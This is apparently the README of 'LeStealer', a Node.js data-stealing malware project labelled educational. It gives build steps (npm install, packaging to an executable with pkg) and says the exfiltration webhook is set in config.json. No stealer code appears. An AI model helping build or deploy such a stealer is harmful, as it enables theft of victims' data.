# LeStealer

Advanced **datastealer** coded on NodeJS for educational purposes.

## Prerequisites

* [Node.js](https://nodejs.org/)

## Setup

Installing:
```bash
npm install
npm i pkg
```
Compiling to exe:
```bash
pkg config.json
```

In order to modify the webhook, change it in config.json file
